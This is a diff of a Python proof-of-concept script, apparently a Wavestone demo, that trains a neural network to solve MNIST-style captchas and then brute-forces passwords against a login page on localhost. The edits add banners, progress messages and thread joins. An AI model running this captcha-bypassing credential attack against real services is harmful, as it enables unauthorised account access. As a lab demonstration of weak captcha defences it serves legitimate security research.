@@ -1,13 +1,3 @@
-print (""" 
-██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
-██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
-██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████ 
-                                                                                       
-                                Wavestone POC attack
-""")
-
 import threading
 import requests
 import time
@@ -25,6 +15,19 @@ import tensorflow as tf
 import cv2
 from io import BytesIO
 from urllib.request import urlopen
+
+
+
+print (""" 
+██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
+██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
+██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████ 
+                                                                                       
+                                Wavestone POC attack
+""")
+sys.stdout.flush()
 
 CAPTCHA_TYPE = 0
 
@@ -130,22 +133,37 @@ def main():
 
     if CAPTCHA_TYPE == 0 :
         url = "http://localhost:3006/auth/login"
-        ###################### MNIST Captcha #########################
-        print("starting attack pipeline")
+        ######################### MNIST Captcha #########################
+        print("######################### Starting attack pipeline #########################")
+        print("\n\n1/8 : Retrieving captcha images")
+        sys.stdout.flush()
         captcha_images = retrieve_captcha_images("http://localhost:3006/auth/login", number_iter=300)
-        print("retrieve images ok")
+        print("Images retrieved successfully !")
+        print("\n\n2/8 : Converting images to tensorflow dataset")
+        sys.stdout.flush()
         tfds_captcha_images = convert_to_tfds(captcha_images)
-        print("convert images ok")
+        print("Images successfully converted !")
+        print("\n\n3/8 : Labeling images with MNIST")
+        sys.stdout.flush()
         predictions = label_mnist(tfds_captcha_images)
-        print("label images ok")
+        print("Images successfully labeled !")
+        print("\n\n4/8 : Converting attacker images to tensorflow dataset")
+        sys.stdout.flush()
         attacker_dataset = convert_to_tfds(captcha_images, predictions)
-        print("attacker dataset ok")
+        print("Attack images successfully converted !")
+        print("\n\n5/8 : Creating attacker Neural Network")
+        sys.stdout.flush()
         attacker_model = attacker_cnn_mnist.create_model()
-        print("attacker model ok")
+        print("Attacker model successfully created !")
+        print("\n\n6/8 : Training attacker model")
+        sys.stdout.flush()
         trained_model = attacker_cnn_mnist.train(attacker_model, attacker_dataset, epochs=5)
-        print("training model ok")
+        print("Attacker model successfully trained !")
+        print("\n\n7/8 : Initializing bruteforce cracker with trained attacker model")
+        sys.stdout.flush()
         cracker = BruteForceCracker(url, username, error, trained_model)
-        print("cracking ok")
+        print("Bruteforce cracker initialization complete !")
+        sys.stdout.flush()
         ###############################################################
     elif CAPTCHA_TYPE == 1 : 
         url = "http://localhost:3006/auth/login?captchaType=EMNIST"
@@ -159,7 +177,11 @@ def main():
         python_model = get_attacker_from_ckpt_python()
         cracker = BruteForceCracker(url, username, error, python_model)
         ###############################################################
+    print("\n\n8/8 : Launching bruteforce cracker with trained attacker model")
+    sys.stdout.flush()
 
+
+    threads = []
     with open("passwords.txt", "r") as f:
         chunk_size = 1000
         while True:
@@ -168,6 +190,9 @@ def main():
                 break
             t = threading.Thread(target=crack_passwords, args=(passwords, cracker))
             t.start()
+            threads.append(t)
+    for thread in threads:
+        thread.join()
 
 if __name__ == '__main__':
     banner = """ 
@@ -179,3 +204,11 @@ if __name__ == '__main__':
     main()
     #retrieve_captcha_images("http://localhost:3006/auth/login?captchaType=Python", number_iter=3)
     #fetch_captcha("http://localhost:3006/auth/login?captchaType=Python")t images ok
+    print("""
+██████   ██████  ███    ██ ███████     ██ 
+██   ██ ██    ██ ████   ██ ██          ██ 
+██   ██ ██    ██ ██ ██  ██ █████       ██ 
+██   ██ ██    ██ ██  ██ ██ ██             
+██████   ██████  ██   ████ ███████     ██ 
+                                          
+                                          """)
